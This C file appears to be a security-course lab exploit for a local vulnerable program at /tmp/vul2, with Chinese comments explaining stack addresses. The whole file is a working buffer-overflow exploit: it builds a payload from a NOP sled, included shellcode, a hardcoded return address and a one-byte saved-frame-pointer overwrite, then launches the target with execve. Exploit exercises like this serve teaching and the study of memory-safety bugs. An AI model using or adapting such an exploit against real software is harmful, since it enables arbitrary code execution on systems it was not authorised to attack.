#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/vul2"

int main(void)
{
	char payload[201];
	//初始化，全部置为nop
	memset(payload, '\x90', 201);

	/*shellcode复制到payload中
	(buf)0xffffdcb8,(buf[199])0xffffdd7f,ebp指向的帧值为0xffffdd00,
	所以要使0xffffdd7f-8*i = shellcode的地址，且容量大于25，即8*i>25,
	令i=5,8*i = 0x28，shellcode地址为0xffffdd57,与buf初始偏移159*/

	memcpy(payload+159, shellcode, 25);

	//最后1个字节改为4f,4f-57之前是留pop的ebp和跳转地址
	memcpy(payload+200, "\x4f", 1);
	
	//跳转地址
	memcpy(payload+155, "\x57\xdd\xff\xff", 4);
	
	
  char *args[] = { TARGET, payload, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
